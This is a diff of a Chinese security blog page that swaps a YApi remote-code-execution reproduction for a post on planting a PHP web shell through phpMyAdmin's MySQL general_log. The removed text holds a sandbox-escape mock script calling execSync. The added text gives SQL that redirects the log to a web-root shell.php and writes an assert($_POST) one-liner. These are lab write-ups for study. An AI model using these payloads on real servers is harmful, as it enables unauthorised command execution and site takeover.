@@ -20,25 +20,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="YApi（RCE）复现来源：微信公众号(星期五实验室) https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;Mzg3NDYwNjQyMw&#x3D;&#x3D;&amp;mid&#x3D;2247484376&amp;idx&#x3D;1&amp;sn&#x3D;f5dc6fe510b6eb11d3c0d2e587b5f021&amp;chksm&#x3D;cecf79e0f9b8f0f6c9cd2d8e44edeee2212135493f6">
+  <meta name="description" content="约束：权限为 root ，phpmyadmin管理页面泄露 原理：全局函数的可控，导致日志属性（路径，内容）的可控。  general log 指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭。  general log file 指的是日志的保存路径。   set general_log &#x3D;’on’; 状态设置为打开。默认为关闭 set global general_">
 <meta property="og:type" content="article">
-<meta property="og:title" content="回忆之丘">
-<meta property="og:url" content="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="phpMyAdmin的日志写入shell">
+<meta property="og:url" content="http://example.com/2021/10/06/phpMyAdmin%E7%9A%84%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell/index.html">
 <meta property="og:site_name" content="回忆之丘">
-<meta property="og:description" content="YApi（RCE）复现来源：微信公众号(星期五实验室) https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;Mzg3NDYwNjQyMw&#x3D;&#x3D;&amp;mid&#x3D;2247484376&amp;idx&#x3D;1&amp;sn&#x3D;f5dc6fe510b6eb11d3c0d2e587b5f021&amp;chksm&#x3D;cecf79e0f9b8f0f6c9cd2d8e44edeee2212135493f6">
+<meta property="og:description" content="约束：权限为 root ，phpmyadmin管理页面泄露 原理：全局函数的可控，导致日志属性（路径，内容）的可控。  general log 指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭。  general log file 指的是日志的保存路径。   set general_log &#x3D;’on’; 状态设置为打开。默认为关闭 set global general_">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/image/image.png">
-<meta property="og:image" content="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/image/image_1.png">
-<meta property="og:image" content="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/image/6%607%5B%7BDN$%25_EW91U61YCF0XA.png">
-<meta property="og:image" content="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/image/image_2.png">
-<meta property="og:image" content="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/image/image_3.png">
-<meta property="article:published_time" content="2021-10-06T02:13:26.477Z">
-<meta property="article:modified_time" content="2021-10-06T02:12:53.922Z">
+<meta property="article:published_time" content="2021-10-06T02:22:57.021Z">
+<meta property="article:modified_time" content="2021-10-06T02:23:32.805Z">
 <meta property="article:author" content="Poem_n">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/image/image.png">
 
-<link rel="canonical" href="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="http://example.com/2021/10/06/phpMyAdmin%E7%9A%84%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell/">
 
 
 <script id="page-configurations">
@@ -51,7 +45,7 @@
   };
 </script>
 
-  <title> | 回忆之丘</title>
+  <title>phpMyAdmin的日志写入shell | 回忆之丘</title>
   
 
 
@@ -156,7 +150,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/06/phpMyAdmin%E7%9A%84%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -169,7 +163,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          
+          phpMyAdmin的日志写入shell
         </h1>
 
         <div class="post-meta">
@@ -180,7 +174,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-10-06 10:13:26 / 修改时间：10:12:53" itemprop="dateCreated datePublished" datetime="2021-10-06T10:13:26+08:00">2021-10-06</time>
+              <time title="创建时间：2021-10-06 10:22:57 / 修改时间：10:23:32" itemprop="dateCreated datePublished" datetime="2021-10-06T10:22:57+08:00">2021-10-06</time>
             </span>
 
           
@@ -194,29 +188,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="YApi（RCE）复现"><a href="#YApi（RCE）复现" class="headerlink" title="YApi（RCE）复现"></a>YApi（RCE）复现</h1><p>来源：微信公众号(星期五实验室)</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&mid=2247484376&idx=1&sn=f5dc6fe510b6eb11d3c0d2e587b5f021&chksm=cecf79e0f9b8f0f6c9cd2d8e44edeee2212135493f6bc209947ec86a2723822a341021132413&mpshare=1&scene=23&srcid=07155BojIRfYLNMwkPXuyOql&sharer_sharetime=1626332811477&sharer_shareid=4f2ed20b8bd17e5da3b26b8f611904fc#rd">https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247484376&amp;idx=1&amp;sn=f5dc6fe510b6eb11d3c0d2e587b5f021&amp;chksm=cecf79e0f9b8f0f6c9cd2d8e44edeee2212135493f6bc209947ec86a2723822a341021132413&amp;mpshare=1&amp;scene=23&amp;srcid=07155BojIRfYLNMwkPXuyOql&amp;sharer_sharetime=1626332811477&amp;sharer_shareid=4f2ed20b8bd17e5da3b26b8f611904fc#rd</a></p>
-<h2 id="搭建环境遇到坑。。。"><a href="#搭建环境遇到坑。。。" class="headerlink" title="搭建环境遇到坑。。。"></a>搭建环境遇到坑。。。</h2><p>1.node 版本 并不是网上的越新越好。。。。</p>
-<p>2，一定要配置可切换 node版本的软件（nvm）</p>
-<p>3.这是大坑！！！！nvm 安装 node某些版本时，有的没有 npm。直接暴毙！！我找的一个稳定的版本。（v12.13.0）</p>
-<p>4数据库不一定界面化（或者说可视化）主要是服务要打开   （如遇到打不开的情况，要删除2个文件。ps：路径是自己安装路径）</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/83685797">https://blog.csdn.net/dyw_666666/article/details/83685797</a></p>
-<p>5，最后部署时，管理员邮箱最好改一改，我样本次数不多（4次），默认时只出现一次错误，改名后解决。</p>
-<h3 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h3><p>1.注册后登录</p>
-<p><img src="image/image.png"></p>
-<p>2,添加项目</p>
-<p><img src="image/image_1.png"></p>
-<p>3,打开全局mock脚本，并写入代码</p>
-<p><img src="image/6%607%5B%7BDN$%25_EW91U61YCF0XA.png"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="keyword">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="keyword">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <p>约束：权限为 root ，phpmyadmin管理页面泄露</p>
+<p>原理：全局函数的可控，导致日志属性（路径，内容）的可控。</p>
+<ul>
+<li><p>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</p>
+</li>
+<li><p>general log file 指的是日志的保存路径。</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin/">set general_log =’on’;</a> 状态设置为打开。默认为关闭</p>
+<p>set global general_log_file=’E:/oldphpstday/WWW/shell.php’;</p>
+<p>将路径设置为网站目录，并命名为shell.php</p>
+<p>我们现在写入一句话~ 强调一下，SQL就是SQL，在保存到日志中的时候不会解析转译符号，不知道大家能否理解，我举一个例子：</p>
+<p>我们查询：</p>
+<p>SELECT ‘<?php assert(_POST['admin']);?>‘;<br>php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>
+<p>SELECT ‘<?php assert($_POST["admin"]);?>‘;</p>
+<p>POST中不用引号也可以~</p>
 
-
-
-<p>4.添加接口</p>
-<p><img src="image/image_2.png"></p>
-<p>5.访问目标网页</p>
-<p><img src="image/image_3.png"></p>
-<h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2>
     </div>
 
     
@@ -293,7 +281,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">YApi（RCE）复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%E9%81%87%E5%88%B0%E5%9D%91%E3%80%82%E3%80%82%E3%80%82"><span class="nav-number">1.1.</span> <span class="nav-text">搭建环境遇到坑。。。</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">渗透流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#end"><span class="nav-number">1.2.</span> <span class="nav-text">end</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
